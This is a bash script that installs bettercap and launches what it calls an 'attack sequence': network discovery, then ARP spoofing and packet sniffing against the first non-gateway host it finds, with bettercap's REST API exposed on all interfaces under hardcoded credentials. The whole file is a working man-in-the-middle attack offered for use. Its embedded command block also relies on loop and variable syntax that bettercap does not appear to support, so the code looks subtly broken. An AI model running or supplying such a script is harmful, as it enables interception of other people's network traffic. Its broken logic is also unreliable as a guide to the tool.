#!/bin/bash

# Check if bettercap is installed
if ! command -v bettercap &> /dev/null; then
    echo "Bettercap not found. Installing..."
    
    # Check if we have sudo privileges
    if [ "$(id -u)" -ne 0 ]; then
        echo "Please run this script as root or with sudo to install bettercap."
        exit 1
    fi
    
    # Install bettercap based on package manager
    if command -v apt &> /dev/null; then
        apt update && apt install -y bettercap
    elif command -v yum &> /dev/null; then
        yum install -y bettercap
    elif command -v dnf &> /dev/null; then
        dnf install -y bettercap
    elif command -v pacman &> /dev/null; then
        pacman -Sy --noconfirm bettercap
    else
        echo "Unsupported package manager. Please install bettercap manually."
        exit 1
    fi
fi

# Check if bettercap was installed successfully
if ! command -v bettercap &> /dev/null; then
    echo "Failed to install bettercap. Please install it manually."
    exit 1
fi

echo "Bettercap is installed. Starting the attack sequence..."

# Run bettercap in the background with all the commands
bettercap -eval "
    net.recon on;
    sleep 5;
    net.probe on;
    sleep 10;
    set arp.spoof.fullduplex true;
    set net.sniff.local true;
    set api.rest.username darkbert;
    set api.rest.password 20231405;
    set api.rest.address 0.0.0.0;
    set api.rest.port 8081;
    set api.rest.websocket true;
    api.rest on;
    
    # Get gateway IP
    gateway = net.probe.gateway;
    # Get all discovered hosts except gateway
    hosts = net.probe.hosts;
    target = '';
    
    for(host in hosts) {
        if(host.ip != gateway) {
            target = host.ip;
            break;
        }
    }
    
    if(target != '') {
        set arp.spoof.targets target;
        arp.spoof on;
        net.sniff on;
        echo 'Attack started against ' + target;
    } else {
        echo 'No suitable target found (excluding gateway)';
    }
" > /dev/null 2>&1 &

echo "Bettercap is running in the background with the specified configuration."
echo "REST API is accessible at http://0.0.0.0:8081 with username:darkbert password:20231405"
